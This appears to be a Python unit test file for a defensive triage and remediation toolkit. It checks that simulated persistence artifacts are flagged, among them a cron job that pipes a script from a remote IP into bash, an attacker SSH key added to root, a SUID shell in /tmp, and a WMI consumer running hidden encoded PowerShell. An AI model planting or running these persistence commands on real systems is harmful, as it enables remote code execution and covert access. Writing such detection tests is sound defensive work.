import unittest
import json
import os
from bluekit.resp import triage, remediate
from bluekit import paths

class TestTriageCollectorFormat(unittest.TestCase):
    def setUp(self):
        self.linux_fixture_path = os.path.join(os.path.dirname(__file__), 'fixtures', 'linux_collector_format.json')
        self.win_fixture_path = os.path.join(os.path.dirname(__file__), 'fixtures', 'real_win11_benign.json')
        
        with open(self.linux_fixture_path, 'r', encoding='utf-8') as f:
            self.linux_data = json.load(f)
            
        with open(self.win_fixture_path, 'r', encoding='utf-8') as f:
            self.win_data = json.load(f)
            
    def test_linux_benign_fixture_quiet(self):
        # baselinesiz
        findings, extra = triage.analyze(kb=None, current=self.linux_data, baseline=None)
        
        high_cron = sum(1 for f in findings if f['category'] == 'cron' and f['confidence'] == 'high')
        high_suid = sum(1 for f in findings if f['category'] == 'suid_files' and f['confidence'] == 'high')
        high_ssh = sum(1 for f in findings if f['category'] == 'ssh_authorized_keys' and f['confidence'] == 'high')
        
        self.assertEqual(high_cron, 0)
        self.assertEqual(high_suid, 0)
        self.assertEqual(high_ssh, 0)
        
        for f in findings:
            self.assertTrue(f['item'], f"Bo'sh item topildi: {f}")
            self.assertFalse(str(f['item']).startswith("{'path'"), f"Noto'g'ri suid item: {f['item']}")
            
    def test_linux_attack_detected(self):
        import copy
        atk_data = copy.deepcopy(self.linux_data)
        
        atk_data.setdefault('cron', []).append({"user":"www-data","job":"*/5 * * * * curl -s http://185.215.113.66/x.sh | bash"})
        atk_data.setdefault('ssh_authorized_keys', []).append({"file":"/root/.ssh/authorized_keys","key":"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDattackerKey9kQ attacker@kali"})
        atk_data.setdefault('suid_files', []).append({"path":"/tmp/.x/bash"})
        
        # baselinesiz
        findings, extra = triage.analyze(kb=None, current=atk_data, baseline=None)
        
        cron_highs = [f for f in findings if f['category'] == 'cron' and f['confidence'] == 'high']
        suid_highs = [f for f in findings if f['category'] == 'suid_files' and f['confidence'] == 'high']
        ssh_highs = [f for f in findings if f['category'] == 'ssh_authorized_keys' and f['confidence'] == 'high']
        
        # Baselinesiz ham high
        self.assertEqual(len(cron_highs), 1)
        self.assertEqual(len(suid_highs), 1)
        self.assertEqual(len(ssh_highs), 1)
        
        # baseline = asl fixture
        findings2, _ = triage.analyze(kb=None, current=atk_data, baseline=self.linux_data)
        cron_highs2 = [f for f in findings2 if f['category'] == 'cron' and f['confidence'] == 'high']
        suid_highs2 = [f for f in findings2 if f['category'] == 'suid_files' and f['confidence'] == 'high']
        ssh_highs2 = [f for f in findings2 if f['category'] == 'ssh_authorized_keys' and f['confidence'] == 'high']
        
        self.assertEqual(len(cron_highs2), 1)
        self.assertEqual(len(suid_highs2), 1)
        self.assertEqual(len(ssh_highs2), 1)
        
        c = cron_highs2[0]
        self.assertIn("curl -s http://185.215.113.66/x.sh | bash", c['item'])
        
        s = ssh_highs2[0]
        self.assertIn("attacker@kali", s['item'])
        self.assertIn("(user: root)", s['item'])
        
        su = suid_highs2[0]
        self.assertIn("/tmp/.x/bash", su['item'])
        
    def test_legacy_format_still_works(self):
        import copy
        atk_data = copy.deepcopy(self.linux_data)
        
        atk_data.setdefault('cron', []).append({"user":"www-data","line":"*/5 * * * * curl -s http://185.215.113.66/x.sh | bash"})
        atk_data.setdefault('ssh_authorized_keys', []).append({"file":"/root/.ssh/authorized_keys","key_fingerprint_or_line":"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDattackerKey9kQ attacker@kali"})
        atk_data.setdefault('suid_files', []).append("/tmp/.x/bash")
        
        findings, extra = triage.analyze(kb=None, current=atk_data, baseline=self.linux_data)
        
        cron_highs = [f for f in findings if f['category'] == 'cron' and f['confidence'] == 'high']
        suid_highs = [f for f in findings if f['category'] == 'suid_files' and f['confidence'] == 'high']
        ssh_highs = [f for f in findings if f['category'] == 'ssh_authorized_keys' and f['confidence'] == 'high']
        
        self.assertEqual(len(cron_highs), 1)
        self.assertEqual(len(suid_highs), 1)
        self.assertEqual(len(ssh_highs), 1)
        
    def test_linux_defender_ignored(self):
        import copy
        d = copy.deepcopy(self.linux_data)
        d['defender'] = {"realtime": False, "exclusions": []}
        
        findings, extra = triage.analyze(kb=None, current=d, baseline=None)
        def_findings = [f for f in findings if f['category'] == 'defender']
        self.assertEqual(len(def_findings), 0)
        
    def test_windows_wmi_startup_defender(self):
        import copy
        d = copy.deepcopy(self.win_data)
        d.setdefault('meta', {})['os'] = 'windows'
        
        d.setdefault('wmi_subscriptions', []).append({"name":"SystemPerfMonitor","query":"SELECT * FROM __InstanceModificationEvent WITHIN 60","consumer":"powershell.exe -nop -w hidden -enc SQBFAFgA"})
        d['wmi_subscriptions'].append({"name":"SCM Event Log Filter","query":"select * from MSFT_SCMEventLogEvent","consumer":"NTEventLogEventConsumer.Name=\"SCM Event Log Consumer\""})
        
        d.setdefault('startup_items', []).append({"location":"C:\\Users\\u\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup","name":"update.vbs","path":"...\\update.vbs"})
        d['startup_items'].append("desktop.ini")
        
        d['defender'] = {"realtime": True, "exclusions": ["C:\\Users\\Public\\Downloads"]}
        
        findings, extra = triage.analyze(kb=None, current=d, baseline=None)
        
        wmi_high = [f for f in findings if f['category'] == 'wmi_subscriptions' and f['confidence'] == 'high']
        startup_high = [f for f in findings if f['category'] == 'startup_items' and f['confidence'] == 'high']
        def_high = [f for f in findings if f['category'] == 'defender' and f['confidence'] == 'high']
        
        self.assertEqual(len(wmi_high), 1)
        self.assertEqual(wmi_high[0]['item'], 'SystemPerfMonitor')
        wmi_all = [f for f in findings if f['category'] == 'wmi_subscriptions']
        self.assertFalse(any(f['item'] == 'SCM Event Log Filter' for f in wmi_all))
        
        self.assertEqual(len(startup_high), 1)
        self.assertEqual(startup_high[0]['item'], 'update.vbs')
        startup_all = [f for f in findings if f['category'] == 'startup_items']
        self.assertFalse(any(f['item'] == 'desktop.ini' for f in startup_all))
        
        self.assertEqual(len(def_high), 1)
        
    def test_defender_na_warning(self):
        import copy
        d = copy.deepcopy(self.win_data)
        d.setdefault('meta', {})['os'] = 'windows'
        d['defender'] = {"realtime": True, "exclusions": ["N/A: Must be an administrator to view exclusions"]}
        
        findings, extra = triage.analyze(kb=None, current=d, baseline=None)
        
        def_findings = [f for f in findings if f['category'] == 'defender']
        self.assertEqual(len(def_findings), 0)
        
        self.assertIn('warnings', extra)
        self.assertTrue(any("admin" in w for w in extra['warnings']))
        
    def test_remediate_never_empty_pattern(self):
        f_cron = {'category': 'cron', 'item': 'cron item', 'raw': '', 'score': 0.8, 'confidence': 'high', 'techniques': []}
        gen = remediate.generate(f_cron, 'linux')
        self.assertIn("REMOVE manually", gen)
        self.assertNotIn("grep -v \"\"", gen)
        self.assertNotIn("grep -vF -- ''", gen)
        
        f_ssh = {'category': 'ssh_authorized_keys', 'item': 'ssh item', 'raw': '', 'score': 0.8, 'confidence': 'high', 'techniques': []}
        gen2 = remediate.generate(f_ssh, 'linux')
        self.assertIn("REMOVE manually", gen2)
        self.assertNotIn("sed -i '//d'", gen2)
        
        f_cron2 = {'category': 'cron', 'item': '*/5 * * * * curl -s http://185.215.113.66/x.sh | bash (user: www-data)', 'raw': '*/5 * * * * curl -s http://185.215.113.66/x.sh | bash', 'user': 'www-data', 'score': 0.8, 'confidence': 'high', 'techniques': []}
        gen3 = remediate.generate(f_cron2, 'linux')
        self.assertIn("grep -vF --", gen3)
        self.assertIn("crontab -u www-data", gen3)
        self.assertNotIn("(user:", gen3.split("REMOVE")[1].split("VERIFY")[0])
        
    def test_remediate_autorun_hklm(self):
        f = {'category': 'autoruns', 'item': 'bad', 'raw': 'cmd.exe', 'location': 'HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run', 'score': 0.8, 'confidence': 'high', 'techniques': []}
        gen = remediate.generate(f, 'windows')
        self.assertIn("HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", gen)
        self.assertNotIn("HKCU", gen)
        
if __name__ == '__main__':
    unittest.main()
